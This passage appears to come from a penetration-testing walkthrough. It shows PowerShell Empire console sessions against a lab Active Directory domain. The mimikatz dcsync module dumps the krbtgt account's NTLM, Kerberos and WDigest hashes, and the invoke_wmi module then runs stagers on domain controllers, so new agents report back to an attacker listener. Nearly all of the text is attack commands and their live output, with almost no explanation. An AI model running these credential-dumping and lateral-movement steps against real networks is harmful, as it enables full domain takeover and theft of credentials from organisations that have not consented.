+&nbsp; Name &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Required &nbsp; &nbsp;Value &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Description<br/>
+&nbsp; ---- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -------- &nbsp; &nbsp;------- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -----------<br/>
+&nbsp; domain &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Specified (fqdn) domain to pull for the<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;primary domain/DC.<br/>
+&nbsp; user &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; True &nbsp; &nbsp; &nbsp; &nbsp;RESEARCH\krbtgt &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Username to extract the hash for<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(domain\username format).<br/>
+&nbsp; Agent &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;True &nbsp; &nbsp; &nbsp; &nbsp;HX2Y4KAS34TVVHKN &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Agent to run module on.<br/>
+&nbsp; dc &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Specified (fqdn) domain controller to<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;pull replication data from.<br/>
+<br/>
+(Empire: credentials/mimikatz/dcsync) &gt; set user SITTINGDUCK\krbtgt<br/>
+(Empire: credentials/mimikatz/dcsync) &gt; set domain sittingduck.info<br/>
+(Empire: credentials/mimikatz/dcsync) &gt; run<br/>
+(Empire: credentials/mimikatz/dcsync) &gt;<br/>
+Job started: Debug32_e6cz9<br/>
+<br/>
+Hostname: CLIENT2K8.research.sittingduck.info / S-1-5-21-1931688288-432673180-3111857317<br/>
+&nbsp; .#####. &nbsp; mimikatz 2.0 alpha (x64) release "Kiwi en C" (Aug 23 2015 23:05:23)<br/>
+&nbsp;.## ^ ##.<br/>
+&nbsp;## / \ ## &nbsp;/* * *<br/>
+&nbsp;## \ / ## &nbsp; Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )<br/>
+&nbsp;'## v ##' &nbsp; http://blog.gentilkiwi.com/mimikatz &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (oe.eo)<br/>
+&nbsp; '#####' &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; with 16 modules * * */<br/>
+<br/>
+<br/>
+mimikatz(powershell) # lsadump::dcsync /user:SITTINGDUCK\krbtgt /domain:sittingduck.info<br/>
+[DC] 'sittingduck.info' will be the domain<br/>
+[DC] 'DC2.sittingduck.info' will be the DC server<br/>
+<br/>
+[DC] 'SITTINGDUCK\krbtgt' will be the user account<br/>
+<br/>
+Object RDN &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; : krbtgt<br/>
+<br/>
+** SAM ACCOUNT **<br/>
+<br/>
+SAM Username &nbsp; &nbsp; &nbsp; &nbsp; : krbtgt<br/>
+Account Type &nbsp; &nbsp; &nbsp; &nbsp; : 30000000 ( USER_OBJECT )<br/>
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )<br/>
+Account expiration &nbsp; :<br/>
+Password last change : 10/9/2015 3:49:10 PM<br/>
+Object Security ID &nbsp; : S-1-5-21-2988714168-2756154285-2485713731-502<br/>
+Object Relative ID &nbsp; : 502<br/>
+<br/>
+Credentials:<br/>
+&nbsp; Hash NTLM: 26db375e3e5fde959313241890b3a1ea<br/>
+&nbsp; &nbsp; ntlm- 0: 26db375e3e5fde959313241890b3a1ea<br/>
+&nbsp; &nbsp; lm &nbsp;- 0: 05a1c1d6a05b53f837786a728fa9d8bb<br/>
+<br/>
+Supplemental Credentials:<br/>
+* Primary:Kerberos-Newer-Keys *<br/>
+&nbsp; &nbsp; Default Salt : SITTINGDUCK.INFOkrbtgt<br/>
+&nbsp; &nbsp; Default Iterations : 4096<br/>
+&nbsp; &nbsp; Credentials<br/>
+&nbsp; &nbsp; &nbsp; aes256_hmac &nbsp; &nbsp; &nbsp; (4096) : fe5a81ff76409c984ca2d0a46affdd87cc103877ee498b2b639f19eecff9e238<br/>
+&nbsp; &nbsp; &nbsp; aes128_hmac &nbsp; &nbsp; &nbsp; (4096) : d470bd3bdb25667663779523cae3a4ea<br/>
+&nbsp; &nbsp; &nbsp; des_cbc_md5 &nbsp; &nbsp; &nbsp; (4096) : 10bf61e6025efdb5<br/>
+<br/>
+* Primary:Kerberos *<br/>
+&nbsp; &nbsp; Default Salt : SITTINGDUCK.INFOkrbtgt<br/>
+&nbsp; &nbsp; Credentials<br/>
+&nbsp; &nbsp; &nbsp; des_cbc_md5 &nbsp; &nbsp; &nbsp; : 10bf61e6025efdb5<br/>
+<br/>
+* Packages *<br/>
+&nbsp; &nbsp; Kerberos-Newer-Keys<br/>
+<br/>
+* Primary:WDigest *<br/>
+&nbsp; &nbsp; 01 &nbsp;e9ab3d1449afc1cfd8275ae019809f01<br/>
+&nbsp; &nbsp; 02 &nbsp;94797592fb2263a3408996313e10feec<br/>
+&nbsp; &nbsp; 03 &nbsp;df54a71fe7c6a0a23ec84a49ede10ff1<br/>
+&nbsp; &nbsp; 04 &nbsp;e9ab3d1449afc1cfd8275ae019809f01<br/>
+&nbsp; &nbsp; 05 &nbsp;94797592fb2263a3408996313e10feec<br/>
+&nbsp; &nbsp; 06 &nbsp;3c43dfcdec94b738971417875b18b26a<br/>
+&nbsp; &nbsp; 07 &nbsp;e9ab3d1449afc1cfd8275ae019809f01<br/>
+&nbsp; &nbsp; 08 &nbsp;ff2c419c507876e296252ce0d5bd18bf<br/>
+&nbsp; &nbsp; 09 &nbsp;ff2c419c507876e296252ce0d5bd18bf<br/>
+&nbsp; &nbsp; 10 &nbsp;27b2c212c995140484321a39cd188ec8<br/>
+&nbsp; &nbsp; 11 &nbsp;786563d6e9b4f7bdf127b866734802ae<br/>
+&nbsp; &nbsp; 12 &nbsp;ff2c419c507876e296252ce0d5bd18bf<br/>
+&nbsp; &nbsp; 13 &nbsp;64b6a311317dca09646ba391a12fd372<br/>
+&nbsp; &nbsp; 14 &nbsp;786563d6e9b4f7bdf127b866734802ae<br/>
+&nbsp; &nbsp; 15 &nbsp;febdf2223051f7bfb524ccb0325e7c66<br/>
+&nbsp; &nbsp; 16 &nbsp;febdf2223051f7bfb524ccb0325e7c66<br/>
+&nbsp; &nbsp; 17 &nbsp;0cf66fd198a946f46e14b833f45dc8bb<br/>
+&nbsp; &nbsp; 18 &nbsp;d83fc5e642dc5e703e35de7772ab25bd<br/>
+&nbsp; &nbsp; 19 &nbsp;04e48653fecf74355524d93177571239<br/>
+&nbsp; &nbsp; 20 &nbsp;468436d1b868b2bc918c97b4020d26b0<br/>
+&nbsp; &nbsp; 21 &nbsp;66323feaf64a290c56020f26396a16c8<br/>
+&nbsp; &nbsp; 22 &nbsp;66323feaf64a290c56020f26396a16c8<br/>
+&nbsp; &nbsp; 23 &nbsp;00699f1bc514e661fbd1e29101fe24de<br/>
+&nbsp; &nbsp; 24 &nbsp;4add75a98618c36fed652c0aa059f3ab<br/>
+&nbsp; &nbsp; 25 &nbsp;4add75a98618c36fed652c0aa059f3ab<br/>
+&nbsp; &nbsp; 26 &nbsp;935c908fccd9d8d766e4cd5a2de5eab5<br/>
+&nbsp; &nbsp; 27 &nbsp;5adc9c0f998ba568f11fce07d0f3b34f<br/>
+&nbsp; &nbsp; 28 &nbsp;73ce101707505940042f6a6ec3670c37<br/>
+&nbsp; &nbsp; 29 &nbsp;5a14a12a0afaab5341344058ed71028d<br/>
+<br/>
+<b>Using WMI for lateral movement into DCs and parent DCs &nbsp;</b><br/>
+(Empire: lateral_movement/invoke_wmi) &gt; info<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Name: Invoke-WMI<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Module: lateral_movement/invoke_wmi<br/>
+&nbsp; &nbsp; &nbsp;NeedsAdmin: False<br/>
+&nbsp; &nbsp; &nbsp; OpsecSafe: True<br/>
+&nbsp; &nbsp;MinPSVersion: 2<br/>
+&nbsp; &nbsp; &nbsp;Background: False<br/>
+OutputExtension: None<br/>
+<br/>
+Authors:<br/>
+&nbsp; @harmj0y<br/>
+<br/>
+Description:<br/>
+&nbsp; Executes a stager on remote hosts using WMI.<br/>
+<br/>
+Options:<br/>
+<br/>
+&nbsp; Name &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Required &nbsp; &nbsp;Value &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Description<br/>
+&nbsp; ---- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -------- &nbsp; &nbsp;------- &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -----------<br/>
+&nbsp; Listener &nbsp; &nbsp; &nbsp; &nbsp; True &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Listener to use.<br/>
+&nbsp; CredID &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CredID from the store to use.<br/>
+&nbsp; ComputerName &nbsp; &nbsp; True &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Host[s] to execute the stager on, comma<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;separated.<br/>
+&nbsp; Proxy &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;False &nbsp; &nbsp; &nbsp; default &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Proxy to use for request (default, none,<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;or other).<br/>
+&nbsp; UserName &nbsp; &nbsp; &nbsp; &nbsp; False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [domain\]username to use to execute<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;command.<br/>
+&nbsp; ProxyCreds &nbsp; &nbsp; &nbsp; False &nbsp; &nbsp; &nbsp; default &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Proxy credentials<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;([domain\]username:password) to use for<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;request (default, none, or other).<br/>
+&nbsp; UserAgent &nbsp; &nbsp; &nbsp; &nbsp;False &nbsp; &nbsp; &nbsp; default &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; User-agent string to use for the staging<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;request (default, none, or other).<br/>
+&nbsp; Password &nbsp; &nbsp; &nbsp; &nbsp; False &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Password to use to execute command.<br/>
+&nbsp; Agent &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;True &nbsp; &nbsp; &nbsp; &nbsp;HX2Y4KAS34TVVHKN &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Agent to run module on.<br/>
+<br/>
+(Empire: lateral_movement/invoke_wmi) &gt; set Listener AttackerKBExample<br/>
+(Empire: lateral_movement/invoke_wmi) &gt; set ComputerName RDC1<br/>
+(Empire: lateral_movement/invoke_wmi) &gt; run<br/>
+(Empire: lateral_movement/invoke_wmi) &gt; [+] Initial agent VRY24YVDEGDUNN3V from 172.16.102.11 now active<br/>
+<br/>
+(Empire: lateral_movement/invoke_wmi) &gt; set ComputerName RDC2BEAN<br/>
+(Empire: lateral_movement/invoke_wmi) &gt; run<br/>
+(Empire: lateral_movement/invoke_wmi) &gt; set ComputerName dc1.sittingduck.info<br/>
+[+] Initial agent N2T2ED3RFHDLRWFR from 172.16.102.15 now active<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
